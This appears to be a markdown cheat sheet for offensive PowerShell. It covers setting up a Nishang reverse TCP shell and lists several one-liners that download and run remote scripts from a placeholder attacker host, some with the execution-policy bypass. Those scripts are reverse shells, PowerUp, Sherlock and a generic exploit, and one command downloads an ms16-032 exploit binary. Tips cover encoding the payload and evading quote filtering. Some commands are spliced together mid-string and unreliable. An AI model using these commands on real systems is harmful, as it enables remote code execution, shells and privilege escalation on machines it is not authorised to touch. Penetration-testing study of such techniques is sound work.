
## You want to be a powershell gangster ? Here are the resources 
1. https://github.com/PowerShellMafia/PowerSploit 
2. https://github.com/samratashok/nishang

##### Powershell Reverse shell Cheets 
* Step 1. Nishang Folder
Select the appropriate module within the Nishang folder
![image](https://user-images.githubusercontent.com/57737355/90054359-9f0c3480-dc90-11ea-9313-2b0a215b17c4.png)
* Step 2. Editing Script 
Copy to appropriate folder and follow the instructions for syntax in the script. By adding this line causes the shell to automatically invoke PowershellTcp shell and send it to the listener. Replace IP and port accordingly to your needs
![image](https://user-images.githubusercontent.com/57737355/90055047-97995b00-dc91-11ea-8c7a-2d0d6ebe46d8.png)


* Step 3. Host the shell on your web server and & execute the reverse shell 
	- Host the PS reverse shell on your web server of choice. 
	- Craft an IEX object. IEX is cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command.

* Examples below 
  * powershell "IEX (New-Object Net.WebClient).DownloadString('http://IPADDRESS/shell.ps1')"
  * powershell "IEX (New-Object Net.WebClient).DownloadString('http://IPADDRESS/jaws-enum.ps1

*TIPS*
- Might need to url encode the IEX object if you're executing this in a web browser 
- You may have to play with the quotation marks on some machines, since sometimes the ' character is filtered (such as in SQL environments.)

##### PowerShell GET Scripts

![image](https://user-images.githubusercontent.com/57737355/90055586-6a997800-dc92-11ea-8729-100e746c5543.png)
PS Wget remote scripts and execute 
> c:\powershell.exe -exec bypass -C "IEX (N c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://IPADDRESS/PowerUp.ps1') ; Invoke-AllChecks"

PS Wget remote scripts and execute 
> c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://IPADDRESS:8000/powerup.ps1') ; Invoke-AllChecks"

PS Wget remote scripts and execute 
> c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://IPADDRESS:8000/Sherlock.ps1') ; Find-AllVulns"

If you have your ps1 file downloaded to the victim machine then run using this
Executing Sherlock scripts(depreciated) 
> c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

Wget exploit from remote host and executing the exploit 
> c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"ew-Object Net.WebClient).DownloadString('http://IPADDRESS/exploit.ps1') ; Invoke-exploit.ps1"


##### Powershell wget example 
![image](https://user-images.githubusercontent.com/57737355/90055487-3faf2400-dc92-11ea-85ec-2080b880fb7c.png)
Command: powershell wget "http://IPADDRESS/ms16-032.exe" -outfile "exploit.exe"
